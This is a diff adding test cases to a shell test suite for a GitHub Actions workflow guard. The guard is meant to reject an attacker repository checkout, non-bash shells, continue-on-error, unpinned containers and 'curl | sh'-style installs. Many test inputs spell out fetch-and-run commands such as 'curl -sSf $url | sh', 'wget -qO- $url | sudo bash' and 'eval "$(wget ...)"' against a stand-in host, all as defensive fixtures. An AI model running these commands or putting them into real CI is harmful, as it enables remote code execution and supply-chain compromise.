@@ -60,7 +60,12 @@ checkout='actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'
 setup_java='actions/setup-java@b843ebf9b913146b38da2eaa7aeddf76074ae1ad # v6.1.0'
 env_anchor='          MODE: ${{ inputs.mode }}'
 run_anchor='          case $MODE in'
+script_anchor='          rustup show'
+inline_run_anchor='        run: scripts/check-no-cargo-config.sh'
 steps_anchor='    steps:'
+job_anchor='    timeout-minutes: 5'
+checkout_with='          persist-credentials: false'
+url=https://e.example/install.sh
 central_user="SONA""TYPE_USERNAME"
 central_task="publishTo""MavenCentral"
 central_prop="mavenCentral""Username"
@@ -174,6 +179,88 @@ expect_fail "scripts: a step that is gone" "scripts: no step calls platforms/and
   replace_line "        run: platforms/android/scripts/ci-parity.sh target/ci-results" "        run: scripts/conformance-parity.sh"
 expect_fail "scripts: a script that does not exist" "is not an executable regular file" \
   replace_line "        run: platforms/android/scripts/ci-parity.sh target/ci-results" "        run: platforms/android/scripts/ci-parity.sh target/ci-results && platforms/android/scripts/ci-missing.sh"
+
+# Per-action with: allow-list (F08, security audit L3): a checkout of another repository, ref or
+# credential runs the attacker's ci-*.sh in every later step.
+expect_fail "with: checkout repository" "actions: with: repository is not allowed for actions/checkout" insert_after "$checkout_with" "          repository: attacker/polyjose-fork"
+expect_fail "with: checkout ref" "actions: with: ref is not allowed for actions/checkout" insert_after "$checkout_with" "          ref: evil"
+expect_fail "with: checkout ssh-key" "actions: with: ssh-key is not allowed for actions/checkout" insert_after "$checkout_with" "          ssh-key: x"
+expect_fail "with: checkout token" "actions: with: token is not allowed for actions/checkout" insert_after "$checkout_with" "          token: x"
+expect_fail "with: checkout path" "actions: with: path is not allowed for actions/checkout" insert_after "$checkout_with" "          path: elsewhere"
+expect_fail "with: a case-variant checkout key" "actions: with: repository is not allowed for actions/checkout" insert_after "$checkout_with" "          Repository: attacker/polyjose-fork"
+expect_fail "with: a checkout key before uses:" "actions: with: repository is not allowed for actions/checkout" insert_after "$steps_anchor" "      - with:\n          persist-credentials: false\n          repository: attacker/polyjose-fork\n        uses: $checkout"
+expect_fail "with: a checkout without persist-credentials: false" "actions: actions/checkout without with: persist-credentials: false" replace_str "persist-credentials: false" "fetch-depth: 1"
+expect_fail "with: a checkout without with:" "actions: actions/checkout without with: persist-credentials: false" insert_after "$steps_anchor" "      - uses: $checkout"
+expect_fail "with: a non-integer fetch-depth" "actions: with: fetch-depth" insert_after "$checkout_with" "          fetch-depth: \${{ inputs.mode }}"
+expect_fail "with: a flow-style with:" "actions: with: must be a block of keys" insert_after "$steps_anchor" "      - uses: $checkout\n        with: { persist-credentials: false, repository: evil/x }"
+expect_fail "with: an input another action does not list" "actions: with: workspaces is not allowed for Swatinem/rust-cache" insert_after "          save-if: \${{ github.ref == 'refs/heads/main' }}" "          workspaces: evil"
+expect_fail "with: download-artifact from another repository" "actions: with: repository is not allowed for actions/download-artifact" insert_after "          pattern: jvm-natives-*" "          repository: attacker/x\n          run-id: 1"
+expect_fail "with: setup-java server-id" "actions: with: server-id is not allowed for actions/setup-java" insert_after '          java-version: "21"' "          server-id: x"
+expect_fail "with: without uses:" "actions: with: without uses: in the same step" insert_after "$steps_anchor" "      - name: x\n        with:\n          a: b\n        run: \"true\""
+expect_fail "with: outside a step" "actions: with: outside a step" insert_after "$job_anchor" "    with:\n      a: b"
+expect_fail "with: two uses: in one step" "structure: a second uses: in one step" insert_after "$steps_anchor" "      - uses: $checkout\n        uses: $setup_java\n        with:\n          persist-credentials: false"
+expect_pass "with: a checkout fetch-depth is allowed" insert_after "$checkout_with" "          fetch-depth: 0"
+
+# shell: only bash, anywhere (defaults.run.shell runs before every step).
+expect_fail "shell: a defaults.run.shell command" "shell: only bash" replace_str "    shell: bash" "    shell: bash -c 'curl -sSf $url | sh; bash {0}'"
+expect_fail "shell: a step shell: sh" "shell: only bash" insert_after "$inline_run_anchor" "        shell: sh"
+expect_fail "shell: a step shell: pwsh" "shell: only bash" insert_after "$inline_run_anchor" "        shell: pwsh"
+expect_fail "shell: a custom bash {0}" "shell: only bash" insert_after "$inline_run_anchor" "        shell: bash --noprofile {0}"
+expect_fail "shell: a value on the next line" "shell: only bash" insert_after "$inline_run_anchor" "        shell:\n          sh"
+expect_fail "shell: a job defaults in flow style" "shell: a flow-style shell:" insert_after "$job_anchor" "    defaults: { run: { shell: sh } }"
+expect_fail "shell: a case-variant key" "shell: only bash" insert_after "$inline_run_anchor" "        Shell: sh"
+expect_pass "shell: a step shell: bash is allowed" insert_after "$inline_run_anchor" "        shell: bash"
+
+# continue-on-error, in any position and with any value: a failing guard must fail the job.
+expect_fail "continue-on-error: on a guard step" "continue-on-error: not allowed" insert_after "$inline_run_anchor" "        continue-on-error: true"
+expect_fail "continue-on-error: on a job" "continue-on-error: not allowed" insert_after "$job_anchor" "    continue-on-error: true"
+expect_fail "continue-on-error: false or an expression" "continue-on-error: not allowed" insert_after "$job_anchor" "    continue-on-error: \${{ matrix.cross != '' }}"
+expect_fail "continue-on-error: in a flow-style step" "continue-on-error: not allowed" insert_after "$steps_anchor" "      - { name: x, run: \"true\", continue-on-error: true }"
+expect_fail "continue-on-error: a case-variant key" "continue-on-error: not allowed" insert_after "$inline_run_anchor" "        Continue-On-Error: true"
+
+# container: and services: (an unpinned image runs every step).
+expect_fail "containers: a job container" "containers: container: or services:" insert_after "$job_anchor" "    container: attacker/image:latest"
+expect_fail "containers: a container block" "containers: container: or services:" insert_after "$job_anchor" "    container:\n      image: attacker/image:latest"
+expect_fail "containers: services" "containers: container: or services:" insert_after "$job_anchor" "    services:\n      db:\n        image: postgres:latest"
+expect_fail "containers: a case-variant key" "containers: container: or services:" insert_after "$job_anchor" "    Container: attacker/image:latest"
+expect_fail "containers: flow style" "containers: container: or services:" insert_after "$job_anchor" "    strategy: { fail-fast: false, container: x }"
+
+# curl or wget piped to a shell, in a run: script or an inline run:.
+expect_fail "downloads: curl | sh" "downloads: curl or wget piped to a shell" insert_after "$script_anchor" "          curl -sSf $url | sh"
+expect_fail "downloads: curl | bash -s --" "downloads:" insert_after "$script_anchor" "          curl --proto '=https' -fsSL $url | bash -s -- -y"
+expect_fail "downloads: wget -O- | bash" "downloads:" insert_after "$script_anchor" "          wget -O- $url | bash"
+expect_fail "downloads: wget -qO- | sudo bash" "downloads:" insert_after "$script_anchor" "          wget -qO- $url | sudo bash"
+expect_fail "downloads: curl | sudo -E sh -" "downloads:" insert_after "$script_anchor" "          curl -sSL $url | sudo -E sh -"
+expect_fail "downloads: curl | sudo -u root bash" "downloads:" insert_after "$script_anchor" "          curl -s $url | sudo -u root bash"
+expect_fail "downloads: curl | /bin/sh" "downloads:" insert_after "$script_anchor" "          /usr/bin/curl -s $url | /bin/sh"
+expect_fail "downloads: curl | /usr/bin/env bash" "downloads:" insert_after "$script_anchor" "          curl -s $url | /usr/bin/env bash"
+expect_fail "downloads: curl | tee | sh" "downloads:" insert_after "$script_anchor" "          curl -s $url | tee install.sh | sh"
+expect_fail "downloads: curl|sh without spaces" "downloads:" insert_after "$script_anchor" "          curl -s $url|sh"
+expect_fail "downloads: curl | python3" "downloads:" insert_after "$script_anchor" "          curl -s $url | python3 -"
+expect_fail "downloads: a pipe after a line continuation" "downloads:" insert_after "$script_anchor" "          curl -fsSL $url \\\\\n            | sh"
+expect_fail "downloads: a pipe at the end of a line" "downloads:" insert_after "$script_anchor" "          curl -fsSL $url |\n            sh"
+expect_fail "downloads: bash <(curl ...)" "downloads:" insert_after "$script_anchor" "          bash <(curl -s $url)"
+expect_fail "downloads: sh -c \"\$(curl ...)\"" "downloads:" insert_after "$script_anchor" "          sh -c \"\$(curl -fsSL $url)\""
+expect_fail "downloads: eval \"\$(wget ...)\"" "downloads:" insert_after "$script_anchor" "          eval \"\$(wget -qO- $url)\""
+expect_fail "downloads: an inline run:" "downloads:" replace_line "$inline_run_anchor" "        run: curl -sSf $url | sh"
+expect_fail "downloads: an inline run: folded onto the next line" "downloads:" replace_line "$inline_run_anchor" "        run: curl -sSf $url\n          | sh"
+expect_fail "downloads: a folded run: > block" "downloads:" replace_line "$inline_run_anchor" "        run: >\n          curl -sSf $url\n          | sh"
+expect_fail "downloads: a case-variant Run: block" "downloads:" replace_line "$inline_run_anchor" "        Run: |\n          curl -sSf $url | sh"
+expect_pass "downloads: curl to a file, a pipe to a non-shell, || and the words in names" insert_after "$script_anchor" "          curl -fsSLo rustup-init.sh $url\n          curl -o file $url\n          curl -s $url | grep -q shell\n          curl -s $url | jq .bash\n          curl -f $url || exit 1\n          v=\$(curl -s $url); echo \"\$v\""
+expect_pass "downloads: curl | sh in a step name is not a run: script" replace_str "      - name: no cargo config" "      - name: no curl | sh here"
+
+# The words are not keys: container, services and continue-on-error in a script or a name pass.
+expect_pass "containers: the words in run: scripts and names" insert_after "$script_anchor" "          docker run --name container x\n          echo \"container: none, services: none, continue-on-error: no, shell: sh\""
+expect_pass "containers: the words in an inline run:" replace_line "$inline_run_anchor" "        run: scripts/check-no-cargo-config.sh container services"
+expect_pass "containers: the words in a step name" replace_str "      - name: no cargo config" "      - name: container and services smoke, continue-on-error off"
+
+# Case variants of keys (matched on the lowercased line).
+expect_fail "case: - Uses: unpinned" "actions:" insert_after "$steps_anchor" "      - Uses: attacker/evil-action@main"
+expect_fail "case: - USES: with an allowed pin" "structure: \"USES\" is a case variant of uses:" insert_after "$steps_anchor" "      - USES: $setup_java"
+expect_fail "case: With:" "structure: \"With\" is a case variant of with:" replace_str "        with:" "        With:"
+expect_fail "case: a second top-level On:" "top-level on: keys" append "On:\n  push:"
+expect_fail "case: a Permissions: block" "permissions: only contents: read" insert_after "$job_anchor" "    Permissions:\n      actions: read"
+expect_fail "case: Run: with \${{ }}" "inside a run: script" replace_line "$inline_run_anchor" "        Run: echo \${{ inputs.mode }}"
 
 # Comments do not count.
 expect_pass "comments: a commented trigger and secrets mention" insert_after "on:" "  # pull_request:   (\${{ secrets.X }}, publish, signing: not code)"
